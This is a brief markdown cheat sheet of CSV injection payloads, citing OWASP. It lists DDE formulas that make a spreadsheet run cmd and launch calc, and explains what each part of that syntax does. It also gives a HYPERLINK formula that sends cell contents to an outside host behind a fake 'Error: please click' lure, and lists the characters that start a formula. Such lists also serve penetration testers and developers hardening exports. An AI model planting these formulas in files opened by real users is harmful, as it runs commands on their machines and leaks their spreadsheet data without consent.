# CSV_Injection

## Payload
```
=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")
=DDE(server; file; item; mode)
=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
=cmd|' /C calc'!A0

DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0

Technical Details of the above payload:
cmd is the name the server can respond to whenever a client is trying to access the server
/C calc is the file name which in our case is the calc(i.e the calc.exe)
!A0 is the item name that specifies unit of data that a server can respond when the client is requesting the data
```
Any formula can be started with
```
=
+
–
@
```
## Reference: https://www.owasp.org/index.php/CSV_Injection
